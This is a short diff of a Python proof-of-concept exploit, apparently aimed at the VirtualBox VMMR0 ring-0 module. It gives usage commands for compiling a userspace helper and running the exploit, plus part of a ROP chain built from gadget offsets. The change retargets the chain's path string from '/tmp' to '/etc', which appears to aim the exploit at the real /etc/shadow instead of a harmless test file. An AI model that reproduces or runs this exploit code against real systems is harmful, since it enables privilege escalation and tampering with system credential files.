@@ -27,13 +27,8 @@
 # OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 # OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 '''
-
-
-
-
-
 gcc -g -D OF_SIZE=128 userspace.c -o userspace
-python3 ./poc.py VMMR0.r0 payload 100
+python3 ./poc.py userspace VMMR0.r0 payload 20
 
 Open another shell session and run this
 rm /tmp/shadow && touch /tmp/shadow && watch -n 0.2 ls -lAF /tmp/shadow
@@ -106,8 +101,8 @@ def build(leak, gadget_file, sled_length):
     # pop rax; ret;
     rop.raw(adjuster(leak + 0x01f7bd))
     # /etc
-    # rop.raw(b'/etc')
-    rop.raw(b'/tmp')
+    rop.raw(b'/etc')
+    # rop.raw(b'/tmp')
     # pop rdi; ret;
     rop.raw(adjuster(leak + 0x07b62a))
     # set rdi
